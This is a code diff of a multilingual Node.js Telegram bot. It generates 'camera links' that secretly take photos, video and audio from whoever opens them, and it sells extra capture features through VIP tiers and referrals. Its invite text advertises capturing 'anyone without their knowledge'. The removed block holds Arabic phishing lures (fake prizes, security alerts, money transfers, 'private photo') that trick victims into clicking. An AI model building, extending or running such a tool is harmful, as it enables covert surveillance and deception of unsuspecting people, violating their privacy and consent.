@@ -18,65 +18,6 @@ const ENCRYPTION_IV = process.env.ENCRYPTION_IV; // 16 bytes
 const HMAC_SECRET = process.env.HMAC_SECRET; // 32 bytes
 const NONCE_SECRET = process.env.NONCE_SECRET; // 32 bytes
 
-const TEMPLATES = {
-    'gift': {
-        text: '🎁 مبروك! ربحت هدية حصرية، افتح الرابط لاستلامها',
-        og_title: 'مبروك! لقد ربحت هدية حصرية!',
-        og_description: 'اضغط لاستلام هديتك القيمة الآن!',
-        og_image: 'images/gift.png',
-        template_file: 'gift.html'
-    },
-    'private_photo': {
-        text: '📸 شخص أرسل لك صورة خاصة، شوفها من هنا',
-        og_title: 'شخص أرسل لك صورة خاصة!',
-        og_description: 'اضغط هنا لعرض الصورة الخاصة التي أرسلت إليك.',
-        og_image: 'images/private_photo.png',
-        template_file: 'private_photo.html'
-    },
-    'unauthorized_access': {
-        text: '⚠️ تم رصد دخول غير مصرح لحسابك، تحقق الآن',
-        og_title: 'تحذير أمني: تم رصد دخول غير مصرح لحسابك!',
-        og_description: 'يرجى التحقق من نشاط حسابك فوراً لتأمين بياناتك.',
-        og_image: 'images/security_alert.png',
-        template_file: 'unauthorized_access.html'
-    },
-    'pubg_draw': {
-        text: '🎮 ادخل السحب واربح شدات ببجي مجاناً',
-        og_title: 'ادخل السحب واربح شدات ببجي مجاناً!',
-        og_description: 'فرصة لا تعوض للفوز بآلاف الشدات، اضغط للمشاركة الآن!',
-        og_image: 'images/pubg.png',
-        template_file: 'pubg_draw.html'
-    },
-    'money_transfer': {
-        text: '💰 تم تحويل مبلغ لحسابك، تأكد من هنا',
-        og_title: 'تم تحويل مبلغ إلى حسابك!',
-        og_description: 'اضغط هنا للتأكد من استلام المبلغ.',
-        og_image: 'images/money_transfer.png',
-        template_file: 'money_transfer.html'
-    },
-    'account_update': {
-        text: '📱 تحديث مهم لحسابك، يرجى التحقق',
-        og_title: 'تحديث مهم لحسابك، يرجى التحقق!',
-        og_description: 'لا تفوت التحديثات الجديدة، تحقق من حسابك الآن.',
-        og_image: 'images/account_update.png',
-        template_file: 'account_update.html'
-    },
-    'profile_visitors': {
-        text: '🎵 شوف مين زار بروفايلك اليوم',
-        og_title: 'اكتشف من زار بروفايلك اليوم!',
-        og_description: 'فضولك يدفعك؟ اضغط لترى قائمة الزوار الآن!',
-        og_image: 'images/profile_visitors.png',
-        template_file: 'profile_visitors.html'
-    },
-    'exam_results': {
-        text: '📋 نتائج الاختبار جاهزة، افتح الرابط لمعرفتها',
-        og_title: 'نتائج الاختبار جاهزة، افتح الرابط لمعرفتها!',
-        og_description: 'اضغط هنا للاطلاع على نتائجك فوراً.',
-        og_image: 'images/exam_results.png',
-        template_file: 'exam_results.html'
-    }
-};
-
 const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');
@@ -368,9 +309,7 @@ function getDefaultSettings() {
         vip_price_referrals: 10,
         referral_stars: 2,
         cooldown_seconds: 30,
-        welcome_message: '',
-        vip_free: false,
-        vip_duration_days: 0
+        welcome_message: ''
     };
 }
 
@@ -474,36 +413,35 @@ const texts = {
         'vip_section': "🌟 قسم VIP",
         'my_account': "👤 حسابي",
         'help': "❓ مساعدة",
-        'templates_btn': "📋 قوالب",
         'terms_agreed': "تمت الموافقة على الشروط بنجاح! ✅",
         'lang_saved': "تم حفظ اللغة بنجاح! 🌐",
         'send_custom_link': "أرسل الرابط الذي تريد تحويله:",
         'custom_link_generated': "تم إنشاء الرابط المخصص بنجاح! 🎉\n\nرابط الكاميرا الأمامية:\n%s\n\nرابط الكاميرا الخلفية:\n%s",
-        'vip_info': "🌟 <b>قسم VIP</b> 🌟\n\n<b>المميزات:</b>\n• تصوير فيديو حقيقي 5 ثواني 🎥\n• تسجيل صوت 10 ثواني 🎙️\n• بدون كول داون ⚡\n\n<b>خيارات الشراء:</b>\n💫 %s نجمة تليجرام\n👥 %s إحالة مؤكدة",
+        'vip_info': "🌟 <b>قسم VIP</b> 🌟\n\n<b>المميزات:</b>\n• تصوير فيديو حقيقي 5 ثواني 🎥\n• تسجيل صوت 10 ثواني 🎙️\n• بدون كولداون ⚡\n\n<b>طرق الشراء:</b>\n💫 %s نجمة تيلجرام\n👥 %s إحالة مؤكدة",
         'buy_vip_stars': "⭐ شراء بالنجوم (%s نجمة)",
         'buy_vip_referrals': "👥 شراء بالإحالات (%s إحالة)",
         'vip_video': "🎥 رابط فيديو (5 ثواني)",
-        'vip_audio': "🎙️ رابط تسجيل صوتي",
-        'not_vip': "عذراً، هذه الميزة متاحة فقط لأعضاء VIP. ❌",
-        'vip_purchased_referrals': "🎉 تهانينا! تم تفعيل VIP عبر الإحالات!",
-        'not_enough_referrals': "❌ عدد الإحالات غير كافٍ.\nلديك: %s إحالة\nالمطلوب: %s إحالة",
-        'account_info': "👤 <b>معلومات حسابك</b>\n\n🆔 ID: <code>%s</code>\n⭐ النجوم: %s\n👥 الإحالات: %s\n🏅 المستوى: %s\n📊 الحالة: %s\n📸 إجمالي الالتقاطات: %s",
+        'vip_audio': "🎙️ رابط تسجيل صوت",
+        'not_vip': "عذراً، هذه الميزة متاحة فقط لمشتركي VIP. ❌",
+        'vip_purchased_referrals': "🎉 مبروك! تم تفعيل VIP بنجاح عبر الإحالات!",
+        'not_enough_referrals': "❌ عدد إحالاتك غير كافي.\nلديك: %s إحالة\nالمطلوب: %s إحالة",
+        'account_info': "👤 <b>معلومات حسابك</b>\n\n🆔 الآيدي: <code>%s</code>\n⭐ النقاط: %s\n👥 الإحالات: %s\n🏅 المستوى: %s\n📊 الحالة: %s\n📸 إجمالي الالتقاطات: %s",
         'share_invite': "📤 مشاركة رابط الدعوة",
-        'invite_text': "🔥 جرب هذا البوت المذهل! يمكنه التقاط صور لأي شخص دون علمه 📸\nجربه الآن 👇",
+        'invite_text': "🔥 جرب هذا البوت الخرافي! يقدر يصور أي شخص بدون ما يدري 📸\nجربه الحين 👇",
         'status_normal': "عادي",
         'status_vip': "VIP 🌟",
         'maintenance': "عذراً، البوت حالياً في وضع الصيانة. يرجى المحاولة لاحقاً. 🛠️",
         'banned': "عذراً، لقد تم حظرك من استخدام البوت. 🚫",
-        'force_join': "عذراً، يجب عليك الانضمام إلى قناة البوت أولاً لاستخدامه. 📢",
-        'join_channel': "الانضمام إلى القناة",
-        'check_join': "✅ التحقق من الاشتراك",
+        'force_join': "عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه. 📢",
+        'join_channel': "اشترك في القناة",
+        'check_join': "✅ تحقق من الاشتراك",
         'invalid_link': "رابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http أو https.",
         'referral_link': "🔗 رابط الإحالة الخاص بك:\nhttps://t.me/%s?start=%s\n\nشارك هذا الرابط للحصول على نقاط!",
-        'new_referral': "🎉 انضم شخص جديد عبر رابطك! لقد حصلت على نقاط.",
+        'new_referral': "🎉 لقد قام شخص جديد بالاشتراك عبر رابطك! حصلت على نقاط.",
         'payment_success': "تم الدفع بنجاح! أنت الآن عضو VIP. 🎉",
-        'payment_failed': "فشل الدفع. يرجى المحاولة مرة أخرى. ❌",
+        'payment_failed': "فشلت عملية الدفع. يرجى المحاولة مرة أخرى. ❌",
         'cooldown_msg': "⏳ يرجى الانتظار %s ثانية قبل إنشاء رابط جديد.",
-        'daily_bonus': "🎁 مكافأة يومية! لقد حصلت على نقطة إضافية. الرصيد: %s",
+        'daily_bonus': "🎁 مكافأة يومية! حصلت على نقطة إضافية. رصيدك الآن: %s",
         'achievement_unlocked': "🏆 إنجاز جديد: %s",
         'ach_first_capture': "📸 أول التقاط!",
         'ach_first_referral': "👥 أول إحالة!",
@@ -511,12 +449,10 @@ const texts = {
         'ach_fifty_referrals': "💎 50 إحالة!",
         'ach_vip_member': "🌟 عضو VIP!",
         'lang_changed': "تم تغيير اللغة بنجاح! 🌐",
-        'your_id': "🆔 معرفك: <code>%s</code>",
-        'templates_menu': "اختر قالب الرسالة الجاهزة:",
-        'template_link_generated': "تم إنشاء رابط القالب بنجاح! 🎉\n\nرابط القالب:\n%s"
+        'your_id': "🆔 آيدي حسابك: <code>%s</code>"
     },
     'en': {
-        'welcome': "Welcome to the camera bot! 📸\nPlease agree to the terms to start.",
+        'welcome': "Welcome to the Camera Bot! 📸\nPlease agree to the terms to start.",
         'agree_btn': "📝 Read and Agree to Terms",
         'choose_lang': "Please choose your preferred language:",
         'main_menu': "Main Menu 🏠\nChoose what you want to do:",
@@ -526,36 +462,35 @@ const texts = {
         'vip_section': "🌟 VIP Section",
         'my_account': "👤 My Account",
         'help': "❓ Help",
-        'templates_btn': "📋 Templates",
         'terms_agreed': "Terms agreed successfully! ✅",
         'lang_saved': "Language saved successfully! 🌐",
         'send_custom_link': "Send the link you want to convert:",
-        'custom_link_generated': "Custom link generated successfully! 🎉\n\nFront camera link:\n%s\n\nBack camera link:\n%s",
-        'vip_info': "🌟 <b>VIP Section</b> 🌟\n\n<b>Features:</b>\n• Real video capture 5 seconds 🎥\n• Audio recording 10 seconds 🎙️\n• No cooldown ⚡\n\n<b>Purchase Options:</b>\n💫 %s Telegram stars\n👥 %s confirmed referrals",
-        'buy_vip_stars': "⭐ Buy with Stars (%s stars)",
-        'buy_vip_referrals': "👥 Buy with Referrals (%s referrals)",
+        'custom_link_generated': "Custom link generated successfully! 🎉\n\nFront Camera Link:\n%s\n\nBack Camera Link:\n%s",
+        'vip_info': "🌟 <b>VIP Section</b> 🌟\n\n<b>Features:</b>\n• Real 5-second video capture 🎥\n• 10-second audio recording 🎙️\n• No cooldown ⚡\n\n<b>Purchase Options:</b>\n💫 %s Telegram Stars\n👥 %s Confirmed Referrals",
+        'buy_vip_stars': "⭐ Buy with Stars (%s Stars)",
+        'buy_vip_referrals': "👥 Buy with Referrals (%s Referrals)",
         'vip_video': "🎥 Video Link (5 sec)",
         'vip_audio': "🎙️ Audio Recording Link",
         'not_vip': "Sorry, this feature is only available for VIP members. ❌",
         'vip_purchased_referrals': "🎉 Congratulations! VIP activated via referrals!",
-        'not_enough_referrals': "❌ Not enough referrals.\nYou have: %s referrals\nRequired: %s referrals",
-        'account_info': "👤 <b>Your Account Info</b>\n\n🆔 ID: <code>%s</code>\n⭐ Stars: %s\n👥 Referrals: %s\n🏅 Level: %s\n📊 Status: %s\n📸 Total Captures: %s",
+        'not_enough_referrals': "❌ Not enough referrals.\nYou have: %s\nRequired: %s",
+        'account_info': "👤 <b>Your Account Info</b>\n\n🆔 ID: <code>%s</code>\n⭐ Points: %s\n👥 Referrals: %s\n🏅 Level: %s\n📊 Status: %s\n📸 Total Captures: %s",
         'share_invite': "📤 Share Invite Link",
-        'invite_text': "🔥 Try this amazing bot! It can capture anyone without their knowledge 📸\nTry it now 👇",
+        'invite_text': "🔥 Try this amazing bot! It can capture anyone without them knowing 📸\nTry it now 👇",
         'status_normal': "Normal",
         'status_vip': "VIP 🌟",
-        'maintenance': "Sorry, the bot is currently under maintenance. Please try again later. 🛠️",
+        'maintenance': "Sorry, the bot is currently in maintenance mode. Please try again later. 🛠️",
         'banned': "Sorry, you have been banned from using the bot. 🚫",
         'force_join': "Sorry, you must join the bot's channel first to use it. 📢",
         'join_channel': "Join Channel",
         'check_join': "✅ Check Subscription",
         'invalid_link': "Invalid link. Please send a valid link starting with http or https.",
-        'referral_link': "🔗 Your Referral Link:\nhttps://t.me/%s?start=%s\n\nShare this link to get points!",
-        'new_referral': "🎉 Someone new joined via your link! You got points.",
+        'referral_link': "🔗 Your referral link:\nhttps://t.me/%s?start=%s\n\nShare this link to get points!",
+        'new_referral': "🎉 Someone joined and subscribed using your link! You got points.",
         'payment_success': "Payment successful! You are now a VIP member. 🎉",
         'payment_failed': "Payment failed. Please try again. ❌",
         'cooldown_msg': "⏳ Please wait %s seconds before creating a new link.",
-        'daily_bonus': "🎁 Daily Bonus! You got an extra point. Balance: %s",
+        'daily_bonus': "🎁 Daily bonus! You got an extra point. Balance: %s",
         'achievement_unlocked': "🏆 New Achievement: %s",
         'ach_first_capture': "📸 First Capture!",
         'ach_first_referral': "👥 First Referral!",
@@ -563,100 +498,94 @@ const texts = {
         'ach_fifty_referrals': "💎 50 Referrals!",
         'ach_vip_member': "🌟 VIP Member!",
         'lang_changed': "Language changed successfully! 🌐",
-        'your_id': "🆔 Your ID: <code>%s</code>",
-        'templates_menu': "Choose a ready message template:",
-        'template_link_generated': "Template link generated successfully! 🎉\n\nTemplate Link:\n%s"
+        'your_id': "🆔 Your ID: <code>%s</code>"
     },
     'hi': {
         'welcome': "कैमरा बॉट में आपका स्वागत है! 📸\nशुरू करने के लिए कृपया शर्तों से सहमत हों।",
         'agree_btn': "📝 शर्तें पढ़ें और सहमत हों",
         'choose_lang': "कृपया अपनी पसंदीदा भाषा चुनें:",
         'main_menu': "मुख्य मेनू 🏠\nआप क्या करना चाहते हैं चुनें:",
-        'front_cam': "📸 फ्रंट कैमरा",
-        'back_cam': "📸 बैक कैमरा",
+        'front_cam': "📸 सामने का कैमरा",
+        'back_cam': "📸 पीछे का कैमरा",
         'custom_link': "🔗 कस्टम लिंक",
         'vip_section': "🌟 वीआईपी अनुभाग",
         'my_account': "👤 मेरा खाता",
         'help': "❓ सहायता",
-        'templates_btn': "📋 टेम्पलेट्स",
         'terms_agreed': "शर्तों पर सफलतापूर्वक सहमति हुई! ✅",
         'lang_saved': "भाषा सफलतापूर्वक सहेजी गई! 🌐",
         'send_custom_link': "वह लिंक भेजें जिसे आप कनवर्ट करना चाहते हैं:",
-        'custom_link_generated': "कस्टम लिंक सफलतापूर्वक जेनरेट किया गया! 🎉\n\nफ्रंट कैमरा लिंक:\n%s\n\nबैक कैमरा लिंक:\n%s",
-        'vip_info': "🌟 <b>वीआईपी अनुभाग</b> 🌟\n\n<b>विशेषताएं:</b>\n• वास्तविक वीडियो कैप्चर 5 सेकंड 🎥\n• ऑडियो रिकॉर्डिंग 10 सेकंड 🎙️\n• कोई कूलडाउन नहीं ⚡\n\n<b>खरीद विकल्प:</b>\n💫 %s टेलीग्राम सितारे\n👥 %s पुष्टिकृत रेफरल",
+        'custom_link_generated': "कस्टम लिंक सफलतापूर्वक बनाया गया! 🎉\n\nसामने का कैमरा लिंक:\n%s\n\nपीछे का कैमरा लिंक:\n%s",
+        'vip_info': "🌟 <b>वीआईपी अनुभाग</b> 🌟\n\n<b>विशेषताएं:</b>\n• वास्तविक 5-सेकंड वीडियो कैप्चर 🎥\n• 10-सेकंड ऑडियो रिकॉर्डिंग 🎙️\n• कोई कूलडाउन नहीं ⚡\n\n<b>खरीद विकल्प:</b>\n💫 %s टेलीग्राम सितारे\n👥 %s पुष्ट रेफरल",
         'buy_vip_stars': "⭐ सितारों से खरीदें (%s सितारे)",
         'buy_vip_referrals': "👥 रेफरल से खरीदें (%s रेफरल)",
         'vip_video': "🎥 वीडियो लिंक (5 सेकंड)",
         'vip_audio': "🎙️ ऑडियो रिकॉर्डिंग लिंक",
         'not_vip': "क्षमा करें, यह सुविधा केवल वीआईपी सदस्यों के लिए उपलब्ध है। ❌",
-        'vip_purchased_referrals': "🎉 बधाई हो! रेफरल के माध्यम से वीआईपी सक्रिय किया गया!",
+        'vip_purchased_referrals': "🎉 बधाई हो! रेफरल के माध्यम से वीआईपी सक्रिय हो गया!",
         'not_enough_referrals': "❌ पर्याप्त रेफरल नहीं हैं।\nआपके पास: %s रेफरल\nआवश्यक: %s रेफरल",
-        'account_info': "👤 <b>आपके खाते की जानकारी</b>\n\n🆔 आईडी: <code>%s</code>\n⭐ सितारे: %s\n👥 रेफरल: %s\n🏅 स्तर: %s\n📊 स्थिति: %s\n📸 कुल कैप्चर: %s",
+        'account_info': "👤 <b>आपके खाते की जानकारी</b>\n\n🆔 आईडी: <code>%s</code>\n⭐ अंक: %s\n👥 रेफरल: %s\n🏅 स्तर: %s\n📊 स्थिति: %s\n📸 कुल कैप्चर: %s",
         'share_invite': "📤 आमंत्रण लिंक साझा करें",
-        'invite_text': "🔥 इस अद्भुत बॉट को आज़माएं! यह किसी को भी उनकी जानकारी के बिना कैप्चर कर सकता है 📸\nइसे अभी आज़माएं 👇",
+        'invite_text': "🔥 इस अद्भुत बॉट को आज़माएं! यह किसी को भी बिना बताए कैप्चर कर सकता है 📸\nइसे अभी आज़माएं 👇",
         'status_normal': "सामान्य",
         'status_vip': "वीआईपी 🌟",
         'maintenance': "क्षमा करें, बॉट वर्तमान में रखरखाव मोड में है। कृपया बाद में पुनः प्रयास करें। 🛠️",
         'banned': "क्षमा करें, आपको बॉट का उपयोग करने से प्रतिबंधित कर दिया गया है। 🚫",
-        'force_join': "क्षमा करें, आपको इसका उपयोग करने के लिए पहले बॉट के चैनल से जुड़ना होगा। 📢",
-        'join_channel': "चैनल से जुड़ें",
+        'force_join': "क्षमा करें, आपको इसका उपयोग करने के लिए पहले बॉट के चैनल में शामिल होना होगा। 📢",
+        'join_channel': "चैनल में शामिल हों",
         'check_join': "✅ सदस्यता जांचें",
         'invalid_link': "अमान्य लिंक। कृपया http या https से शुरू होने वाला एक वैध लिंक भेजें।",
         'referral_link': "🔗 आपका रेफरल लिंक:\nhttps://t.me/%s?start=%s\n\nअंक प्राप्त करने के लिए इस लिंक को साझा करें!",
-        'new_referral': "🎉 आपके लिंक के माध्यम से कोई नया व्यक्ति जुड़ा! आपको अंक मिले।",
+        'new_referral': "🎉 किसी नए व्यक्ति ने आपके लिंक का उपयोग करके सदस्यता ली है! आपको अंक मिले।",
         'payment_success': "भुगतान सफल! अब आप एक वीआईपी सदस्य हैं। 🎉",
         'payment_failed': "भुगतान विफल। कृपया पुनः प्रयास करें। ❌",
         'cooldown_msg': "⏳ नया लिंक बनाने से पहले कृपया %s सेकंड प्रतीक्षा करें।",
-        'daily_bonus': "🎁 दैनिक बोनस! आपको एक अतिरिक्त बिंदु मिला। शेष: %s",
+        'daily_bonus': "🎁 दैनिक बोनस! आपको एक अतिरिक्त अंक मिला। शेष: %s",
         'achievement_unlocked': "🏆 नई उपलब्धि: %s",
-        'ach_first_capture': "📸 पहला कैप्चर!",
+        'ach_first_capture': "📸 पहली कैप्चर!",
         'ach_first_referral': "👥 पहला रेफरल!",
         'ach_ten_referrals': "🔥 10 रेफरल!",
         'ach_fifty_referrals': "💎 50 रेफरल!",
         'ach_vip_member': "🌟 वीआईपी सदस्य!",
         'lang_changed': "भाषा सफलतापूर्वक बदल दी गई! 🌐",
-        'your_id': "🆔 आपकी आईडी: <code>%s</code>",
-        'templates_menu': "एक तैयार संदेश टेम्पलेट चुनें:",
-        'template_link_generated': "टेम्पलेट लिंक सफलतापूर्वक जेनरेट किया गया! 🎉\n\nटेम्पलेट लिंक:\n%s"
+        'your_id': "🆔 आपकी आईडी: <code>%s</code>"
     },
     'bn': {
-        'welcome': "ক্যামেরা বটে স্বাগতম! 📸\nশুরু করতে শর্তাবলীতে সম্মত হন।",
+        'welcome': "ক্যামেরা বটে স্বাগতম! 📸\nশুরু করতে অনুগ্রহ করে শর্তাবলীতে সম্মত হন।",
         'agree_btn': "📝 শর্তাবলী পড়ুন এবং সম্মত হন",
-        'choose_lang': "আপনার পছন্দের ভাষা নির্বাচন করুন:",
-        'main_menu': "প্রধান মেনু 🏠\nআপনি কি করতে চান তা চয়ন করুন:",
+        'choose_lang': "অনুগ্রহ করে আপনার পছন্দের ভাষা নির্বাচন করুন:",
+        'main_menu': "প্রধান মেনু 🏠\nআপনি যা করতে চান তা নির্বাচন করুন:",
         'front_cam': "📸 সামনের ক্যামেরা",
         'back_cam': "📸 পিছনের ক্যামেরা",
         'custom_link': "🔗 কাস্টম লিঙ্ক",
         'vip_section': "🌟 ভিআইপি বিভাগ",
         'my_account': "👤 আমার অ্যাকাউন্ট",
         'help': "❓ সাহায্য",
-        'templates_btn': "📋 টেমপ্লেট",
-        'terms_agreed': "শর্তাবলী সফলভাবে সম্মত হয়েছে! ✅",
-        'lang_saved': "ভাষা সফলভাবে সংরক্ষিত হয়েছে! 🌐",
+        'terms_agreed': "শর্তাবলীতে সফলভাবে সম্মত হয়েছে! ✅",
+        'lang_saved': "ভাষা সফলভাবে সংরক্ষণ করা হয়েছে! 🌐",
         'send_custom_link': "আপনি যে লিঙ্কটি রূপান্তর করতে চান তা পাঠান:",
         'custom_link_generated': "কাস্টম লিঙ্ক সফলভাবে তৈরি হয়েছে! 🎉\n\nসামনের ক্যামেরার লিঙ্ক:\n%s\n\nপিছনের ক্যামেরার লিঙ্ক:\n%s",
-        'vip_info': "🌟 <b>ভিআইপি বিভাগ</b> 🌟\n\n<b>বৈশিষ্ট্য:</b>\n• আসল ভিডিও ক্যাপচার 5 সেকেন্ড 🎥\n• অডিও রেকর্ডিং 10 সেকেন্ড 🎙️\n• কোন কুলডাউন নেই ⚡\n\n<b>ক্রয়ের বিকল্প:</b>\n💫 %s টেলিগ্রাম স্টার\n👥 %s নিশ্চিত রেফারেল",
+        'vip_info': "🌟 <b>ভিআইপি বিভাগ</b> 🌟\n\n<b>বৈশিষ্ট্য:</b>\n• আসল 5-সেকেন্ড ভিডিও ক্যাপচার 🎥\n• 10-সেকেন্ড অডিও রেকর্ডিং 🎙️\n• কোন কুলডাউন নেই ⚡\n\n<b>ক্রয়ের বিকল্প:</b>\n💫 %s টেলিগ্রাম স্টার\n👥 %s নিশ্চিত রেফারেল",
         'buy_vip_stars': "⭐ স্টার দিয়ে কিনুন (%s স্টার)",
         'buy_vip_referrals': "👥 রেফারেল দিয়ে কিনুন (%s রেফারেল)",
         'vip_video': "🎥 ভিডিও লিঙ্ক (5 সেকেন্ড)",
         'vip_audio': "🎙️ অডিও রেকর্ডিং লিঙ্ক",
         'not_vip': "দুঃখিত, এই বৈশিষ্ট্যটি শুধুমাত্র ভিআইপি সদস্যদের জন্য উপলব্ধ। ❌",
-        'vip_purchased_referrals': "🎉 অভিনন্দন! রেফারেলের মাধ্যমে ভিআইপি সক্রিয় করা হয়েছে!",
+        'vip_purchased_referrals': "🎉 অভিনন্দন! রেফারেলের মাধ্যমে ভিআইপি সক্রিয় হয়েছে!",
         'not_enough_referrals': "❌ পর্যাপ্ত রেফারেল নেই।\nআপনার আছে: %s রেফারেল\nপ্রয়োজন: %s রেফারেল",
-        'account_info': "👤 <b>আপনার অ্যাকাউন্টের তথ্য</b>\n\n🆔 আইডি: <code>%s</code>\n⭐ স্টার: %s\n👥 রেফারেল: %s\n🏅 স্তর: %s\n📊 অবস্থা: %s\n📸 মোট ক্যাপচার: %s",
+        'account_info': "👤 <b>আপনার অ্যাকাউন্টের তথ্য</b>\n\n🆔 আইডি: <code>%s</code>\n⭐ পয়েন্ট: %s\n👥 রেফারেল: %s\n🏅 স্তর: %s\n📊 অবস্থা: %s\n📸 মোট ক্যাপচার: %s",
         'share_invite': "📤 আমন্ত্রণ লিঙ্ক শেয়ার করুন",
-        'invite_text': "🔥 এই আশ্চর্যজনক বটটি চেষ্টা করুন! এটি তাদের অজান্তেই যে কাউকে ক্যাপচার করতে পারে 📸\nএখনই চেষ্টা করুন 👇",
+        'invite_text': "🔥 এই আশ্চর্যজনক বটটি চেষ্টা করুন! এটি কাউকে না জানিয়ে ক্যাপচার করতে পারে 📸\nএখনই চেষ্টা করুন 👇",
         'status_normal': "সাধারণ",
         'status_vip': "ভিআইপি 🌟",
-        'maintenance': "দুঃখিত, বট বর্তমানে রক্ষণাবেক্ষণ মোডে আছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন। 🛠️",
+        'maintenance': "দুঃখিত, বটটি বর্তমানে রক্ষণাবেক্ষণ মোডে আছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন। 🛠️",
         'banned': "দুঃখিত, আপনাকে বট ব্যবহার করা থেকে নিষিদ্ধ করা হয়েছে। 🚫",
         'force_join': "দুঃখিত, এটি ব্যবহার করার জন্য আপনাকে প্রথমে বটের চ্যানেলে যোগ দিতে হবে। 📢",
         'join_channel': "চ্যানেলে যোগ দিন",
         'check_join': "✅ সদস্যতা পরীক্ষা করুন",
         'invalid_link': "অবৈধ লিঙ্ক। অনুগ্রহ করে http বা https দিয়ে শুরু হওয়া একটি বৈধ লিঙ্ক পাঠান।",
         'referral_link': "🔗 আপনার রেফারেল লিঙ্ক:\nhttps://t.me/%s?start=%s\n\nপয়েন্ট পেতে এই লিঙ্কটি শেয়ার করুন!",
-        'new_referral': "🎉 আপনার লিঙ্কের মাধ্যমে নতুন কেউ যোগ দিয়েছে! আপনি পয়েন্ট পেয়েছেন।",
-        'payment_success': "পেমেন্ট সফল হয়েছে! আপনি এখন একজন ভিআইপি সদস্য। 🎉",
+        'new_referral': "🎉 আপনার লিঙ্ক ব্যবহার করে একজন নতুন ব্যক্তি যোগ দিয়েছে! আপনি পয়েন্ট পেয়েছেন।",
+        'payment_success': "পেমেন্ট সফল! আপনি এখন একজন ভিআইপি সদস্য। 🎉",
         'payment_failed': "পেমেন্ট ব্যর্থ হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন। ❌",
         'cooldown_msg': "⏳ নতুন লিঙ্ক তৈরি করার আগে অনুগ্রহ করে %s সেকেন্ড অপেক্ষা করুন।",
         'daily_bonus': "🎁 দৈনিক বোনাস! আপনি একটি অতিরিক্ত পয়েন্ট পেয়েছেন। ব্যালেন্স: %s",
@@ -667,9 +596,7 @@ const texts = {
         'ach_fifty_referrals': "💎 50 রেফারেল!",
         'ach_vip_member': "🌟 ভিআইপি সদস্য!",
         'lang_changed': "ভাষা সফলভাবে পরিবর্তন করা হয়েছে! 🌐",
-        'your_id': "🆔 আপনার আইডি: <code>%s</code>",
-        'templates_menu': "একটি প্রস্তুত বার্তা টেমপ্লেট চয়ন করুন:",
-        'template_link_generated': "টেমপ্লেট লিঙ্ক সফলভাবে তৈরি হয়েছে! 🎉\n\nটেমপ্লেট লিঙ্ক:\n%s"
+        'your_id': "🆔 আপনার আইডি: <code>%s</code>"
     },
     'ru': {
         'welcome': "Добро пожаловать в камеру-бот! 📸\nПожалуйста, согласитесь с условиями, чтобы начать.",
@@ -682,7 +609,6 @@ const texts = {
         'vip_section': "🌟 VIP раздел",
         'my_account': "👤 Мой аккаунт",
         'help': "❓ Помощь",
-        'templates_btn': "📋 Шаблоны",
         'terms_agreed': "Условия успешно согласованы! ✅",
         'lang_saved': "Язык успешно сохранен! 🌐",
         'send_custom_link': "Отправьте ссылку, которую вы хотите преобразовать:",
@@ -719,9 +645,7 @@ const texts = {
         'ach_fifty_referrals': "💎 50 рефералов!",
         'ach_vip_member': "🌟 VIP-участник!",
         'lang_changed': "Язык успешно изменен! 🌐",
-        'your_id': "🆔 Ваш ID: <code>%s</code>",
-        'templates_menu': "Выберите готовый шаблон сообщения:",
-        'template_link_generated': "Ссылка на шаблон успешно сгенерирована! 🎉\n\nСсылка на шаблон:\n%s"
+        'your_id': "🆔 Ваш ID: <code>%s</code>"
     }
 };
 
@@ -891,10 +815,9 @@ async function showLanguageSelection(chat_id) {
 async function showMainMenu(chat_id, lang) {
     const keyboard = {
         inline_keyboard: [
-            [{ text: getTextMsg('front_cam', lang), callback_data: 'menu_front_cam', style: 'primary' }, { text: getTextMsg('back_cam', lang), callback_data: 'menu_back_cam', style: 'primary' }],
-            [{ text: getTextMsg('custom_link', lang), callback_data: 'menu_custom_link', style: 'success' }, { text: getTextMsg('vip_section', lang), callback_data: 'menu_vip', style: 'danger' }],
-            [{ text: getTextMsg('my_account', lang), callback_data: 'menu_account', style: 'success' }, { text: getTextMsg('help', lang), callback_data: 'menu_help', style: 'primary' }],
-            [{ text: getTextMsg('templates_btn', lang), callback_data: 'menu_templates' }]
+            [{ text: getTextMsg('front_cam', lang), callback_data: 'menu_front_cam' }, { text: getTextMsg('back_cam', lang), callback_data: 'menu_back_cam' }],
+            [{ text: getTextMsg('custom_link', lang), callback_data: 'menu_custom_link' }, { text: getTextMsg('vip_section', lang), callback_data: 'menu_vip' }],
+            [{ text: getTextMsg('my_account', lang), callback_data: 'menu_account' }, { text: getTextMsg('help', lang), callback_data: 'menu_help' }]
         ]
     };
 
@@ -917,24 +840,6 @@ async function showMainMenu(chat_id, lang) {
 
 async function showVipSection(chat_id, user) {
     const lang = user.lang;
-    const settings = loadSettings();
-
-    // Check VIP expiry
-    if (user.is_vip && user.vip_expires && user.vip_expires > 0) {
-        const now = Math.floor(Date.now() / 1000);
-        if (now > user.vip_expires) {
-            updateUser(user.id, { is_vip: false, vip_expires: 0 });
-            user.is_vip = false;
-        }
-    }
-
-    // If VIP is free for all, activate it
-    if (!user.is_vip && settings.vip_free) {
-        const duration = settings.vip_duration_days || 0;
-        const expiry = duration > 0 ? Math.floor(Date.now() / 1000) + (duration * 86400) : 0;
-        updateUser(user.id, { is_vip: true, vip_expires: expiry });
-        user.is_vip = true;
-    }
 
     if (user.is_vip) {
         const code_v = generateShortCode();
@@ -946,8 +851,8 @@ async function showVipSection(chat_id, user) {
 
         const keyboard = {
             inline_keyboard: [
-                [{ text: getTextMsg('vip_video', lang), callback_data: 'vip_get_video', style: 'primary' }],
-                [{ text: getTextMsg('vip_audio', lang), callback_data: 'vip_get_audio', style: 'success' }],
+                [{ text: getTextMsg('vip_video', lang), callback_data: 'vip_get_video' }],
+                [{ text: getTextMsg('vip_audio', lang), callback_data: 'vip_get_audio' }],
                 [{ text: '🔙', callback_data: 'back_main' }]
             ]
         };
@@ -956,6 +861,7 @@ async function showVipSection(chat_id, user) {
         const bot_info = await sendTelegramRequest('getMe');
         const bot_username = bot_info.result?.username || 'bot';
         const invite_link = `https://t.me/${bot_username}?start=${user.id}`;
+        const settings = loadSettings();
         const price_refs = settings.vip_price_referrals || 10;
 
